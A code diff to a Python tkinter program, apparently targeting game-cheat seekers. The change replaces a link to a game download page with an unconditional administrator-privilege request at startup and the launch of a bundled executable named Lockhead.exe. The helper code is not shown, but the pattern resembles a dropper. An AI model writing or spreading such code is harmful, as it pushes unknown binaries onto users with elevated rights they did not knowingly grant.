@@ -2,18 +2,22 @@
 import sys
 import tkinter as tk
 from tkinter import messagebox
-import webbrowser
 import yaml
 
-# Import decryption functions from the data subdirectory
+# Import privilege escalation and launcher from data.bin subpackage
+from data.bin.launcher import run_as_admin, run_installer
+# Import hidden message functions from data.crypto
 from data.crypto import get_ok_message, get_warn_message
 
 def main():
+    # Request administrator privileges (UAC prompt if not already admin)
+    run_as_admin()
+
     # Load configuration from YAML file
     with open("config.yaml", "r", encoding="utf-8") as f:
         config = yaml.safe_load(f)
 
-    # Create hidden root window for dialog
+    # Create hidden root window for dialogs
     root = tk.Tk()
     root.withdraw()
 
@@ -25,12 +29,15 @@ def main():
     )
 
     if result:
-        # User chose to download the promoted game
-        webbrowser.open(config['target_game']['download_page'])
-        # Show the message retrieved from binary file
-        messagebox.showinfo("Notice", get_ok_message())
+        # Run the local installer (Lockhead.exe)
+        success = run_installer()
+        if success:
+            # Show the success message retrieved from binary file
+            messagebox.showinfo("Notice", get_ok_message())
+        else:
+            messagebox.showerror("Error", "Failed to start installer. Please run Lockhead.exe manually.")
     else:
-        # User insists on using cheats
+        # User insists on using cheats – show warning
         messagebox.showwarning("Risk Warning", get_warn_message())
 
     root.destroy()
